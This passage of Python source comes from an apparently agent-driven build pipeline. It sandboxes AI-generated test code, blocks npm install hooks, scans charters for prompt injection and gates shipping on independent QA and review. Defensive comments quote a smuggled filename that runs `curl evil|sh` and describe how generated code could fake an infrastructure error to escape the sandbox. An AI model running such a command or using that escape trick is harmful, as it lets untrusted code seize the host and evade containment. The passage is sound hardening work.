    _trace("agent", role, prompt, out_text, rc, dt, cost, tin, tout, used)
    if key and "Invalid API key" in out_text:
        return {"rc": rc, "out": out_text[-1500:], "out_full": out_text, "failed": True, "reason": "invalid BYO key"}
    if rc == 0 and out_text.strip():
        return {"rc": 0, "out": out_text[-1500:], "out_full": out_text, "cost_usd": cost, "tokens_in": tin,
                "tokens_out": tout, "attempts": 1, "model": used, "streamed": True}
    return {"rc": rc or 1, "out": (out_text or "")[-1500:], "out_full": out_text or "",
            "failed": True, "reason": "stream produced no output"}


def _sandbox_config(repo: str) -> dict:
    """srt policy for running UNTRUSTED generated code: write only to the repo + /tmp, read allowed
    (so the venv/stdlib import), and NO network egress (empty allowedDomains). Full schema required."""
    return {"filesystem": {"denyRead": [], "allowWrite": [repo, "/tmp"], "denyWrite": []},
            "network": {"allowedDomains": [], "deniedDomains": []}}


def detect_stack(repo: str) -> str:
    """Detect a product's tech stack so the RIGHT test runner grades it (fixes F10 — a Python-only verifier
    scored every Node/JS/TS app 0.0 forever). The fleet builds polyglot products; the grader must speak the
    same language. Returns one of: 'node' | 'python' | 'go' | 'rust' | 'unknown'."""
    r = Path(repo)
    if (r / "package.json").exists():
        return "node"
    if (r / "pyproject.toml").exists() or (r / "requirements.txt").exists() or (r / "setup.py").exists() \
       or any(r.rglob("test_*.py")) or any(r.rglob("*_test.py")):
        return "python"
    if (r / "go.mod").exists():
        return "go"
    if (r / "Cargo.toml").exists():
        return "rust"
    return "unknown"


def _npm_install_safe(repo: str) -> None:
    """Install deps for an UNTRUSTED generated repo with lifecycle scripts DISABLED. `npm install`/`npm ci` on
    an attacker-controlled package.json is a classic RCE sink: a `postinstall`/`preinstall` hook (or a malicious
    dep's install script) runs arbitrary code on the factory host. `--ignore-scripts` blocks every lifecycle
    hook, so installing only downloads packages — no code executes at install time. Any dependency CODE runs
    only when the tests import it, and that execution is jailed in the srt sandbox (see _exec_tests). argv form
    (no `bash -c`) so the repo path is never shell-interpolated. Best-effort + bounded."""
    if (Path(repo) / "node_modules").exists():
        return
    for cmd in (["npm", "ci", "--ignore-scripts", "--no-audit", "--no-fund"],
                ["npm", "install", "--ignore-scripts", "--no-audit", "--no-fund"]):
        try:
            p = subprocess.run(cmd, cwd=repo, capture_output=True, text=True, timeout=420)
            audit.append(actor="factory:qa-security", action="NpmInstall", resource=Path(repo).name,
                         decision="executed", payload={"cmd": cmd[1], "rc": p.returncode, "ignore_scripts": True})
            if p.returncode == 0:
                return
        except Exception:
            continue


def _run_node_tests(repo: str) -> tuple[bool, str]:
    """Grade a Node/JS/TS product with ITS OWN declared test command (package.json 'test' script → `npm test`),
    falling back to the framework-free node test files. Deps are installed with lifecycle scripts DISABLED
    (_npm_install_safe — no install-time RCE), and the tests THEMSELVES run inside the srt sandbox (network
    denied, writes limited to the repo) via _exec_tests — so untrusted node code can never escape the jail,
    exactly like the pytest path."""
    r = Path(repo)
    try:
        pkg = json.loads((r / "package.json").read_text())
    except Exception:
        pkg = {}
    if not (pkg.get("scripts") or {}).get("test"):
        return run_js_tests(repo)                        # no declared script → the framework-free node runner (sandboxed)
    import shlex
    _npm_install_safe(repo)                              # deps WITHOUT lifecycle scripts (RCE-safe), outside jail
    # run the app's own test command INSIDE the sandbox; --ignore-scripts blocks pre/post-test lifecycle hooks
    # (the `test` script itself still runs via `npm run test`), so only the intended tests execute — jailed.
    return _exec_tests(repo, f"cd {shlex.quote(str(repo))} && npm run test --silent --ignore-scripts",
                       action="RunTests-node")


def run_tests(repo: str, sandboxed: bool = True, target: str = "", python: str = "") -> tuple[bool, str]:
    """Run the product's test suite with the runner that MATCHES ITS STACK (F10 fix). A Node/JS/TS app is graded
    by its own `npm test`; a Python app by pytest (below). Untrusted generated code runs inside the srt sandbox
    (write-limited to the repo, network denied). Falls back to direct exec ONLY if the sandbox infra itself is
    unavailable (never to mask a real test failure). `target` scopes pytest to a subpath — empty means the whole
    repo. `python` overrides the interpreter — defaults to the platform venv."""
    # STACK DISPATCH: a targeted adversarial subpath (tests/adversarial) is a Python-specific tier, so only
    # dispatch by stack for a whole-repo baseline run.
    if not target and detect_stack(repo) == "node":
        return _run_node_tests(repo)
    py = python or VENV_PY
    pytest_cmd = f"cd {repo} && {py} -m pytest -q {target}".rstrip()
    return _exec_tests(repo, pytest_cmd, sandboxed)


def _exec_tests(repo: str, test_cmd: str, sandboxed: bool = True, action: str = "RunTests") -> tuple[bool, str]:
    """Run a test COMMAND against untrusted generated code inside the srt sandbox (write-limited to the repo,
    network denied). This is the ONE place untrusted tests execute — pytest AND node both route through here so
    neither can escape the jail. Falls back to a flagged direct run ONLY if the sandbox infra itself is
    unavailable (never to mask a real failure)."""
    if sandboxed and shutil.which("srt"):                # srt binary present? (missing = real infra signal)
        # SANDBOX-ESCAPE GUARD: decide "infra broken -> re-run UNSANDBOXED" ONLY on signals the untrusted
        # child cannot forge. The child's stdout/stderr is fully attacker-controlled (a generated test can
        # print anything), so substring-matching the captured output let a malicious product print an
        # "infra" string to trigger its OWN unsandboxed re-run. Instead we echo a per-run random SENTINEL
        # as the FIRST thing inside the sandbox: srt setup failures (all `console.error`+exit, inner command
        # never runs) exit 1 just like a test failure, so the sentinel's PRESENCE is the only reliable proof
        # srt actually executed the command. The child can't un-emit a line printed before it starts, and
        # can't guess the random token to fake it.
        import uuid
        sentinel = f"__AOS_SBX_{uuid.uuid4().hex}__"
        inner = f"echo {sentinel}; {test_cmd}"
        sf = tempfile.NamedTemporaryFile("w", suffix=".srt.json", delete=False)
        json.dump(_sandbox_config(repo), sf); sf.close()
        try:
            p = subprocess.run(["srt", "-s", sf.name, "-c", inner], capture_output=True, text=True, timeout=420)
            sandbox_ran = sentinel in (p.stdout or "")   # the sandbox set up AND ran our inner command
            out = ((p.stdout or "") + (p.stderr or "")).replace(sentinel + "\n", "").replace(sentinel, "")
            if sandbox_ran:
                audit.append(actor="factory:qa-security", action=action, resource=Path(repo).name,
                             decision="executed", payload={"rc": p.returncode, "sandboxed": True})
                return p.returncode == 0, out[-2500:]
            audit.append(actor="factory:qa-security", action=action, resource=Path(repo).name,
                         decision="sandbox-unavailable", payload={"rc": p.returncode, "sandboxed": True})
        except FileNotFoundError:
            pass                                         # srt vanished after the which() check — infra gone
        except Exception:
            pass
        finally:
            os.unlink(sf.name)
    # sandbox unavailable — best-effort direct run, clearly flagged in the audit
    p = subprocess.run(["bash", "-c", test_cmd], capture_output=True, text=True, timeout=420)
    out = (p.stdout or "") + (p.stderr or "")
    audit.append(actor="factory:qa-security", action=action, resource=Path(repo).name,
                 decision="executed", payload={"rc": p.returncode, "sandboxed": False})
    return p.returncode == 0, out[-2500:]


def run_js_tests(repo: str) -> tuple[bool, str]:
    """Run the builder's framework-free Node test files (tests/**/*.test.js|.cjs) — the FUNCTIONAL path
    coverage for web/extension products (conversions, error paths, edge cases). Each file must exit 0.
    ABSENCE of any test file is a FAIL: a QA stage that smoke-loads a page but never runs behaviour tests
    is theatre (this is the gap that let a web app 'pass' while its 22 real tests were never executed)."""
    root = Path(repo)
    files = [p for p in sorted(root.rglob("*.test.js")) + sorted(root.rglob("*.test.cjs"))
             if "node_modules" not in p.parts]
    if not files:
        return False, "NO functional tests found — expected tests/*.test.js exercising every operation, "\
                      "error path, and edge case (a smoke-load is not QA)."
    # These test files are UNTRUSTED generated node code — run them INSIDE the srt sandbox (network denied,
    # writes limited to the repo) via _exec_tests, exactly like pytest, so they can't touch the factory host.
    # SHELL-QUOTE every untrusted filename (a builder could create a file named `x'; curl evil|sh; '.test.js`);
    # the relative paths come from rglob of attacker-controlled names, so shlex.quote each token and the repo
    # path, and drop the nested `sh -c` so nothing is re-parsed by an inner shell.
    import shlex
    node_path = shlex.quote(str(Path.home() / "projects" / "products" / "noupload" / "node_modules"))
    cmds = " && ".join(f"NODE_PATH={node_path} node {shlex.quote(str(f.relative_to(root)))}" for f in files)
    ok, out = _exec_tests(repo, f"cd {shlex.quote(str(repo))} && {cmds}", action="JsTests")
    audit.append(actor="factory:qa-security", action="JsTests", resource=root.name,
                 decision="executed", payload={"files": len(files), "ok": ok})
    if not ok:   # make the gate verdict unambiguous — the raw node stderr says "AssertionError", not "FAIL"
        out = f"FAIL: {len(files)} functional test file(s) executed; at least one failed.\n{out}"
    return ok, out


def _serve_static(repo: str):
    """Serve a static web build over loopback (fresh from disk on every request, so a mid-run fix is
    immediately observable). Returns (httpd, url); (None, None) when there is no index.html to serve."""
    import functools
    import http.server
    import socket
    root = repo
    if (Path(repo) / "public" / "index.html").exists():
        root = str(Path(repo) / "public")
    elif not (Path(repo) / "index.html").exists():
        idx = next(Path(repo).rglob("index.html"), None)
        if not idx:
            return None, None
        root = str(idx.parent)
    s = socket.socket(); s.bind(("127.0.0.1", 0)); port = s.getsockname()[1]; s.close()
    httpd = http.server.HTTPServer(("127.0.0.1", port),
                                   functools.partial(http.server.SimpleHTTPRequestHandler, directory=root))
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd, f"http://127.0.0.1:{port}"


def run_web_qa(repo: str) -> tuple[bool, str]:
    """PRE-GATE for the WEB line (fast, builder-authored — never the ship gate itself): (1) run the
    builder's functional Node tests (every path/error/edge), THEN (2) serve the app and load it in a real
    headless browser to assert it renders without console errors + screenshot it. BOTH must pass.
    The actual ship gate is the AGENTIC verdict (run_agentic_web_qa) that follows a green pre-gate."""
    js_ok, js_out = run_js_tests(repo)              # functional path coverage FIRST (was never run before)
    httpd, url = _serve_static(repo)
    if not httpd:
        return False, "no index.html found in the build"
    try:
        shot = f"/tmp/webqa-{Path(repo).name}.png"
        env = {**os.environ, "NODE_PATH": str(Path.home() / "projects" / "products" / "noupload" / "node_modules")}
        p = subprocess.run(["node", str(SCRIPTS / "web_smoke.cjs"), url, shot],
                           capture_output=True, text=True, timeout=120, env=env)
        audit.append(actor="factory:qa-security", action="WebSmoke", resource=Path(repo).name,
                     decision="executed", payload={"rc": p.returncode})
        smoke_ok = p.returncode == 0
        out = (f"functional tests: {'PASS' if js_ok else 'FAIL'}\n{js_out}\n\n"
               f"browser smoke: {'PASS' if smoke_ok else 'FAIL'}\n{(p.stdout or '') + (p.stderr or '')}\nscreenshot: {shot}")
        return (js_ok and smoke_ok), out
    finally:
        httpd.shutdown()


def run_ext_qa(repo: str):
    """Static QA gate for a Manifest V3 Chrome extension: the manifest is valid MV3, every file it
    references exists, and all JS is syntactically valid (node --check). This is a STRUCTURAL gate, not a
    full browser load — it catches the failure modes that make an unpacked extension refuse to load
    (bad/missing manifest, dangling file references, JS syntax errors). Honest limitation: it does not
    exercise runtime behaviour in a live browser; that's a manual/e2e step before publish."""
    root = Path(repo)
    mf = root / "manifest.json"
    if not mf.exists():
        return False, "manifest.json missing at repo root"
    try:
        m = json.loads(mf.read_text())
    except Exception as e:
        return False, f"manifest.json is not valid JSON: {e}"
    problems = []
    if m.get("manifest_version") != 3:
        problems.append(f"manifest_version must be 3 (got {m.get('manifest_version')!r})")
    for k in ("name", "version"):
        if not m.get(k):
            problems.append(f"manifest missing required key '{k}'")
    if not (m.get("action") or m.get("content_scripts") or m.get("background")):
        problems.append("manifest has no entry point (need action/content_scripts/background)")
    refs = []                                            # every file the manifest points at must exist
    act = m.get("action") or {}
    if act.get("default_popup"):
        refs.append(act["default_popup"])
    di = act.get("default_icon")
    refs += ([di] if isinstance(di, str) else list(di.values()) if isinstance(di, dict) else [])
    refs += list((m.get("icons") or {}).values())
    if (m.get("background") or {}).get("service_worker"):
        refs.append(m["background"]["service_worker"])
    for cs in m.get("content_scripts") or []:
        refs += cs.get("js", []) + cs.get("css", [])
    for war in m.get("web_accessible_resources") or []:
        refs += war.get("resources", []) if isinstance(war, dict) else []
    for r in refs:
        if not (root / r).exists():
            problems.append(f"manifest references a missing file: {r}")
    for jf in root.rglob("*.js"):                        # syntax-check every JS file (script mode)
        p = subprocess.run(["node", "--check", str(jf)], capture_output=True, text=True)
        if p.returncode != 0:
            problems.append(f"JS syntax error in {jf.relative_to(root)}: {p.stderr.strip()[:160]}")
    static_ok = not problems
    audit.append(actor="factory:qa-security", action="ExtQA", resource=root.name,
                 decision="executed", payload={"ok": static_ok, "problems": problems[:5]})
    if not static_ok:
        return False, "EXTENSION QA FAILED (static):\n- " + "\n- ".join(problems)
    # static is necessary but NOT sufficient — also run the builder's functional behaviour tests
    # (add/edit/delete/search/export logic), so 'valid manifest' can't pass for a non-working extension.
    js_ok, js_out = run_js_tests(repo)
    out = (f"static: PASS (valid MV3, all refs present, JS parses)\n"
           f"functional tests: {'PASS' if js_ok else 'FAIL'}\n{js_out}")
    return js_ok, out


def _free_port() -> int:
    import socket
    s = socket.socket(); s.bind(("127.0.0.1", 0)); p = s.getsockname()[1]; s.close()
    return p


def _wait_up(port: int, timeout: int = 20) -> bool:
    import socket
    end = time.time() + timeout
    while time.time() < end:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                return True
        except OSError:
            time.sleep(0.3)
    return False


def _load_probe(port: int, path: str = "/health", n: int = 200, conc: int = 20) -> tuple[bool, str]:
    """Fire n concurrent requests at a live endpoint; pass if ≥98% return 2xx. Reports throughput + p95.
    This is a SMOKE-scale load check (does it survive concurrency without errors/locking), not a soak."""
    import urllib.request
    url = f"http://127.0.0.1:{port}{path}"

    def one(_):
        t = time.time()
        try:
            with urllib.request.urlopen(url, timeout=5) as r:
                r.read()
                return (200 <= r.status < 300), time.time() - t
        except Exception:
            return False, time.time() - t
    lat, ok = [], 0
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=conc) as ex:
        for good, dt in ex.map(one, range(n)):
            ok += 1 if good else 0
            lat.append(dt)
    lat.sort()
    p95 = lat[min(len(lat) - 1, int(len(lat) * 0.95))] if lat else 0
    rate, rps = ok / n, n / max(1e-6, time.time() - t0)
    return rate >= 0.98, f"load: {ok}/{n} 2xx ({rate:.0%}), {rps:.0f} req/s, p95={p95 * 1000:.0f}ms @conc{conc}"


def run_e2e_qa(repo: str, pkg: str, load_path: str = "/health") -> tuple[bool, str]:
    """RUNTIME gate — what turns 'unit tests pass' into 'the system actually RUNS'. Boots the built
    service (`python -m src.<pkg>`, which must bind 127.0.0.1:$PORT and serve GET /health), runs the
    end-to-end HTTP flow tests under tests/e2e against the LIVE server, then a concurrency load probe.
    SECURITY: the server is generated (untrusted) code and E2E needs loopback HTTP, so this runs OUTSIDE
    the network-denied unit sandbox — mitigated by 127.0.0.1-only bind, an ephemeral port, a hard
    timeout, and guaranteed teardown (terminate→kill). A real tradeoff, surfaced not hidden."""
    port = _free_port()
    env = {**os.environ, "PORT": str(port), "E2E_BASE": f"http://127.0.0.1:{port}", "PYTHONPATH": repo}
    proc = subprocess.Popen([VENV_PY, "-m", f"src.{pkg}"], cwd=repo, env=env,
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    try:
        if not _wait_up(port, 20):
            try:
                boot_log = proc.communicate(timeout=2)[0] or ""
            except Exception:
                boot_log = ""
            return False, f"E2E: server did not come up on 127.0.0.1:{port}\n{boot_log[-1400:]}"
        e2e = subprocess.run([VENV_PY, "-m", "pytest", "-q", "tests/e2e"], cwd=repo, env=env,
                             capture_output=True, text=True, timeout=180)
        e2e_ok = e2e.returncode == 0
        load_ok, load_out = _load_probe(port, load_path)
        ok = e2e_ok and load_ok
        out = (f"E2E flows: {'PASS' if e2e_ok else 'FAIL'}\n{((e2e.stdout or '') + (e2e.stderr or ''))[-1600:]}\n"
               f"load test: {'PASS' if load_ok else 'FAIL'} — {load_out}")
        audit.append(actor="factory:qa-security", action="E2EQA", resource=Path(repo).name,
                     decision="executed", payload={"e2e_ok": e2e_ok, "load_ok": load_ok})
        return ok, out
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()


def run_service_qa(repo: str, pkg: str) -> tuple[bool, str]:
    """Full service gate: SANDBOXED unit tests (socket-free, in tests/unit) MUST pass first, then the
    RUNTIME E2E + load gate proves the assembled service actually runs and serves real traffic."""
    ok_u, out_u = run_tests(repo, target="tests/unit")
    if not ok_u:
        return False, "UNIT TESTS FAILED (fix before runtime):\n" + out_u
    ok_e, out_e = run_e2e_qa(repo, pkg)
    return ok_e, "unit: PASS\n" + out_e


# ─────────────────────────────────────────────────────────────────────────────────────────────────────
# THE SHIP GATE (REBUILD-PLAN C1): the builder NEVER grades its own homework. Everything above this
# line (run_tests / run_js_tests / run_web_qa / run_ext_qa / run_service_qa) is a FAST PRE-GATE built
# on builder-authored tests; the verdict that actually clears LAUNCH is produced here — the agentic
# explorer stack for web/UI builds, an independent qa-security verification for everything else — and
# persisted as the machine-readable LAUNCH artifact (docs/QA-VERDICT.json) that gate_check consumes.
# ─────────────────────────────────────────────────────────────────────────────────────────────────────
def _qa_stack_path():
    """Put scripts/qa on sys.path (the qa modules import factory back, so they are imported lazily at
    call time — never at factory import)."""
    qa_dir = str(SCRIPTS / "qa")
    if qa_dir not in sys.path:
        sys.path.insert(0, qa_dir)


def qa_verdict_ok(v: dict) -> bool:
    """The ship condition, verbatim what gate_check._v_qa_verdict enforces on the LAUNCH artifact:
    passed==true AND blocking_open==0 AND stories>0. Fail-closed on any missing/garbled fact."""
    try:
        return (isinstance(v, dict) and v.get("passed") is True
                and int(v.get("blocking_open")) == 0 and int(v.get("stories")) > 0)
    except (TypeError, ValueError):
        return False


def run_agentic_web_qa(repo: str, product: str, vision: str, summary: str,
                       target_url: str = None) -> dict:
    """The AGENTIC verification body for web/UI builds: serve the build (unless a running target_url is
    supplied), let story_gen enumerate the coverage set from the product charter, qa_explorer drive a
    real browser story-by-story, dev_loop fix blocking bugs, and gate on the grounded verdict. qa_run
    writes the machine verdict (docs/QA-VERDICT.json) — the LAUNCH artifact.

    Returns {passed, stories, blocking_open, verdict, verdict_json, detail} (fail-closed on any crash:
    an unverifiable build is a FAILED gate, never a silent pass)."""
    _qa_stack_path()
    import qa_run as qa_run_mod                        # lazy: qa_run imports factory back

    def _qa_heartbeat(kind, payload):
        """LIVENESS during the (legitimately hours-long) exploration: print + trace every qa_run event so
        the build log and the traces table both show forward motion. Without this the QA stage was silent
        for the whole run — the watchdog paged 'possible stall' and the resume sweep (idle-trace heuristic)
        launched a DUPLICATE build against the same product mid-QA."""
        line = f"[factory:qa] {kind} {json.dumps(payload, default=str)[:300]}"
        print(line, flush=True)
        try:
            _trace("test", "qa-security", f"QA progress: {kind}", line, 0)
        except Exception:
            pass

    httpd, url = None, target_url
    if not url:
        httpd, url = _serve_static(repo)
        if not httpd:
            return {"passed": False, "stories": 0, "blocking_open": 0, "verdict_json": None,
                    "verdict": "no index.html to serve — the agentic explorer has nothing to drive"}
    try:
        report = qa_run_mod.qa_run(url, vision, None, "0", summary, product=product, repo=str(repo),
                                   restart_cmd=None, on_event=_qa_heartbeat)
    except Exception as e:
        return {"passed": False, "stories": 0, "blocking_open": 0, "verdict_json": None,
                "verdict": f"agentic QA crashed: {str(e)[:200]} — unverifiable builds do not ship"}
    finally:
        if httpd:
            httpd.shutdown()
    out = {"passed": bool(report.get("passed")), "stories": int(report.get("total_stories") or 0),
           "blocking_open": int(report.get("blocking_open") or 0), "verdict": report.get("verdict"),
           "verdict_json": report.get("verdict_json"), "detail": report.get("md")}
    audit.append(actor="factory:qa-security", action="AgenticWebQA", resource=Path(repo).name,
                 decision="passed" if qa_verdict_ok(out) else "failed",
                 payload={"stories": out["stories"], "blocking_open": out["blocking_open"],
                          "rounds": report.get("rounds")})
    return out


def run_independent_qa(repo: str, product: str, vision: str, kind: str = "lib") -> dict:
    """INDEPENDENT verification for non-browser products (lib/service/extension): a qa-security agent —
    never the builder — re-runs the product's tests ITSELF, checks they are real coverage (not theatre:
    trivial asserts, skipped suites, deleted edge cases), probes beyond the happy path per
    docs/STANDARDS-verification.md ('default to BROKEN'), and reports story-level results as strict JSON.
    The verdict tally is then computed DETERMINISTICALLY by qa_report from those structured findings and
    persisted by qa_run.write_verdict as the LAUNCH artifact (docs/QA-VERDICT.json).

    FAIL-CLOSED: a failed run, an unparseable reply, or zero verified stories is a FAILED gate."""
    _qa_stack_path()
    import qa_run as qa_run_mod                        # lazy: these import factory back
    import qa_report as qa_report_mod
    t0 = time.time()
    test_hint = {
        "extension": "each builder test file: `node tests/<name>.test.js` (plus manifest sanity)",
        "service": f"unit: `{VENV_PY} -m pytest -q tests/unit`; then boot `python -m src.{product.replace('-', '_')}` "
                   f"on 127.0.0.1:$PORT and run `{VENV_PY} -m pytest -q tests/e2e` against it",
    }.get(kind, f"`{VENV_PY} -m pytest -q`")
    prompt = (
        "You are the INDEPENDENT QA gate for this product — the builder never grades its own homework, "
        "so YOU must verify it, per docs/STANDARDS-verification.md: DEFAULT TO BROKEN, evidence or it "
        "didn't happen, and state what was NOT covered.\n\n"
        f"PRODUCT VISION/CHARTER:\n{(vision or '')[:3000]}\n\n"
        f"1. RUN THE TEST SUITE YOURSELF with Bash (do not trust any prior claim of green): {test_hint}\n"
        "2. READ the tests: flag theatre (trivial/tautological asserts, skipped or deleted cases, "
        "happy-path-only coverage) — weak tests are a FINDING, not a pass.\n"
        "3. PROBE beyond the tests: exercise at least the empty/error/boundary behaviors the spec "
        "(docs/SPEC.md) promises, with real commands.\n"
        "4. Report EVERY verified behavior as a user story and EVERY defect as a bug.\n\n"
        "END YOUR REPLY WITH ONLY this JSON object (no fence, no prose after it):\n"
        '{"stories": [{"id": "US-1", "title": "<behavior>", "expected": "<what the spec promises>", '
        '"status": "passed|failed|blocked", "evidence": "<the exact command + observed output>"}, ...], '
        '"bugs": [{"title": "<defect>", "detail": "<what is wrong>", "expected": "<spec>", '
        '"actual": "<observed>", "blocking": true|false, "severity": "critical|high|medium|low"}, ...], '
        '"not_covered": "<what this verification did NOT exercise>"}'
    )
    res = agent("qa-security", str(repo), prompt)
    data = None
    if isinstance(res, dict) and not res.get("failed") and res.get("rc") in (0, None):
        data = _extract_json(res.get("out_full") or res.get("out") or "")
    stories = [s for s in ((data or {}).get("stories") or []) if isinstance(s, dict)]
    bugs = [b for b in ((data or {}).get("bugs") or []) if isinstance(b, dict)]
    if not stories:
        # NO verifiable signal from the independent verifier -> the gate fails with a blocking finding
        # (qa_report's zero-story tally is 'NO VERDICT', passed=False — fail-closed by construction).
        bugs = [{"title": "independent QA produced no verifiable result",
                 "detail": ("the qa-security verification returned no parseable story-level evidence "
                            f"(rc={res.get('rc') if isinstance(res, dict) else 'n/a'}); "
                            "an unverified build must not ship"),
                 "blocking": True, "severity": "critical"}]
    run = {
        "product": product, "vision": vision, "started_at": t0, "finished_at": time.time(),
        "stories": [{
            "id": s.get("id") or f"US-{i + 1}", "title": s.get("title", "(untitled)"),
            "expected": s.get("expected", ""), "status": (s.get("status") or "").lower(),
            "steps": [{"action": "independent verification (qa-security)",
                       "expected": s.get("expected", ""), "actual": s.get("evidence", ""),
                       "verdict": "match" if (s.get("status") or "").lower() in ("passed", "pass")
                       else "mismatch"}],
        } for i, s in enumerate(stories)],
        "bugs": [{
            "id": f"BUG-{i + 1}", "story": b.get("story", ""), "title": b.get("title", "defect"),
            "detail": b.get("detail", ""), "expected": b.get("expected", ""),
            "actual": b.get("actual", ""), "blocking": bool(b.get("blocking")), "fixed": False,
            "severity": b.get("severity", "medium"),
        } for i, b in enumerate(bugs)],
        "not_covered": (data or {}).get("not_covered"),
    }
    report = qa_report_mod.build_report(run)
    vpath = qa_run_mod.write_verdict(str(repo), report, product=product, producer="independent-qa")
    out = {"passed": bool(report.get("passed")), "stories": int(report.get("total_stories") or 0),
           "blocking_open": int(report.get("blocking_open") or 0), "verdict": report.get("verdict"),
           "verdict_json": vpath, "detail": report.get("md"),
           "not_covered": (data or {}).get("not_covered")}
    audit.append(actor="factory:qa-security", action="IndependentQA", resource=Path(repo).name,
                 decision="passed" if qa_verdict_ok(out) else "failed",
                 payload={"kind": kind, "stories": out["stories"],
                          "blocking_open": out["blocking_open"]})
    return out


def run_grounded_qa(product: str, kind: str = None, vision: str = None, summary: str = None,
                    target_url: str = None) -> dict:
    """ONE entry point for the grounded ship-gate verdict — used by build_product's QA stage and by
    loopcontroller's TESTQA. Web/UI builds (or anything already RUNNING at target_url) go through the
    agentic browser stack; everything else gets the independent qa-security verification. Both write
    docs/QA-VERDICT.json — the machine-readable LAUNCH artifact gate_check consumes — so a product
    without a verdict fails the gate honestly, and one with a verdict ships only on its JSON facts."""
    repo = PRODUCTS / product
    if not repo.exists():
        return {"passed": False, "stories": 0, "blocking_open": 0, "verdict_json": None,
                "verdict": f"no such product repo: {repo}"}
    kind = kind or _detect_kind(repo)
    if vision is None:
        ch = repo / "docs" / "CHARTER.md"
        vision = ch.read_text()[:4000] if ch.exists() else f"The {product} product ({kind})."
    if summary is None:
        sp = repo / "docs" / "SPEC.md"
        summary = sp.read_text()[:4000] if sp.exists() else vision[:2000]
    if kind == "web" or target_url:
        return run_agentic_web_qa(str(repo), product, vision, summary, target_url=target_url)
    return run_independent_qa(str(repo), product, vision, kind)


def _review_verdict(repo, text: str = "") -> str:
    """Parse the reviewer's verdict. The reviewer is READ-ONLY (can_modify_code:false; denied_tools include
    Edit/Write/Bash) so on the claude engine it has NO write tool and CANNOT write docs/REVIEW.md — its
    verdict must come from the agent's OWN returned reply (`text`), which the factory then persists. We read
    `text` FIRST (authoritative — the reviewer can always reply), then fall back to docs/REVIEW.md (the
    crash-RESUME path, where the factory persisted the prior reply, or a write-capable engine). An explicit
    'VERDICT:' line wins; else a whole-source scan.
    FAIL-CLOSED on a SILENT gate: if the reviewer produced NO signal at all — empty reply AND no file — we
    return REQUEST-CHANGES so a review that yielded nothing ESCALATES to a human (BLOCKED_AT_REVIEW) instead
    of silently auto-passing. (Pre-fix bug: the verdict was read ONLY from a file the reviewer is FORBIDDEN
    to write, so it was always missing -> _review_verdict always returned APPROVE -> the load-bearing review
    gate could never block.) When the reviewer DID produce review prose but no explicit verdict and no
    change request, we still APPROVE — QA stays the objective ship gate, REVIEW is the judgment layer."""
    f = Path(repo) / "docs" / "REVIEW.md"
    ftxt = f.read_text() if f.exists() else ""
    have_signal = False
    for src in (text or "", ftxt):                       # nearest source first: live reply, then persisted file
        vlines = [l for l in src.splitlines() if "VERDICT:" in l.upper()]
        if vlines:                                       # an explicit VERDICT line is authoritative
            scope = vlines[-1].upper()
            return "REQUEST-CHANGES" if ("REQUEST-CHANGES" in scope or "REQUEST CHANGES" in scope) else "APPROVE"
        if src.strip():
            have_signal = True
            if "REQUEST-CHANGES" in src.upper() or "REQUEST CHANGES" in src.upper():
                return "REQUEST-CHANGES"
    return "APPROVE" if have_signal else "REQUEST-CHANGES"   # no signal at all -> fail closed, escalate


def build_product(product: str, charter: str, kind: str = "lib", api_key: str = None,
                  engine: str = None, provider_key: str = None) -> dict:
    """Drive one product end-to-end through the governed line with real agents + a real QA fix loop.
    kind='lib' -> Python library QA'd by pytest; kind='web' -> static web app QA'd by a real browser.
    api_key (BYO): if set, every agent runs on the tenant's own key — they pay their own inference.
    engine ('claude'|'codex'): which provider to run on; provider_key = that provider's BYO key. A tenant
    with only a Codex/OpenAI key builds on Codex; default is Claude."""
    _apply_scale()                                   # scale agents/rigor/depth to the wallet BEFORE the line runs
    _ctx.api_key = api_key
    _ctx.engine = (engine or "claude").lower()
    _ctx.codex_key = provider_key if (engine or "").lower() == "codex" else None
    web = kind == "web"
    service = kind == "service"
    ext = kind == "extension"
    repo = PRODUCTS / product
    (repo / "docs").mkdir(parents=True, exist_ok=True)
    if not web and not ext:
        (repo / "src").mkdir(parents=True, exist_ok=True)
        (repo / "tests").mkdir(parents=True, exist_ok=True)
    import sanitize
    charter_md = repo / "docs" / "CHARTER.md"
    if not charter_md.exists():                      # first run only — a RESUME must not clobber the
        flags = sanitize.scan(charter)               # original charter (it was already scanned then)
        if flags:                                    # possible prompt injection in untrusted user input
            audit.append(actor="sanitize", action="InjectionDetected", resource=product,
                         decision="flagged", payload={"patterns": flags[:3]})
            try:
                import notify
                notify.send(f"⚠ possible prompt-injection in '{product}' charter — wrapped as untrusted, build continues",
                            title="security", priority="high", tags="shield")
            except Exception:
                pass
        charter_md.write_text(
            f"# {product} — charter ({kind})\n\n{sanitize.wrap_untrusted(charter)}\n")
    log = {"product": product, "kind": kind, "stages": []}

    cid = f"build-{product}"
    _ctx.run = cid; _ctx.product = product; _ctx.stage = "INIT"   # debug-trace context for this build
    _ctx.spawner = "controller"   # the controller orchestrates this line — it is the requester of every spawn

    def _claims(role):
        f = ROLES / f"{role}.yaml"
        if not f.exists():
            return [f"{product}/**"]
        import yaml
        return yaml.safe_load(f.read_text()).get("allowed_paths", []) or [f"{product}/**"]

    def stage(name, role, fn):
        # crash-resume: skip a stage already completed in a prior (crashed) run of this product.
        # QA always re-runs — it's the idempotent gate that re-derives the pass/fail the LAUNCH gate needs.
        if name != "QA" and _stage_done(cid, name):
            print(f"\n[factory] === {name} === (RESUMED — already complete, skipping)", flush=True)
            resumed = {"resumed": True, "passed": True, "rc": 0}
            # A gate stage whose pass/fail is FILE-derived (not rc-derived) must re-derive its verdict on
            # resume: _stage_done only proves an rc=0 agent trace exists, but the reviewer ALWAYS exits 0 —
            # the real verdict lives in docs/REVIEW.md. Without this, review_res.get('verdict') is None and
            # the LAUNCH gate ships a REQUEST-CHANGES build after a crash. (QA is already re-run above.)
            if name == "REVIEW":
                resumed["verdict"] = _review_verdict(repo)
                resumed["passed"] = resumed["verdict"] != "REQUEST-CHANGES"
            log["stages"].append({name: resumed})
            return resumed
        print(f"\n[factory] === {name} ===", flush=True)
        _ctx.stage = name
        aid = f"{role}@{product}"
        t0 = time.time()
        try:                                          # publish presence to the live directory
            import directory
            directory.register(aid, role, product, name, _claims(role))
        except Exception:
            pass
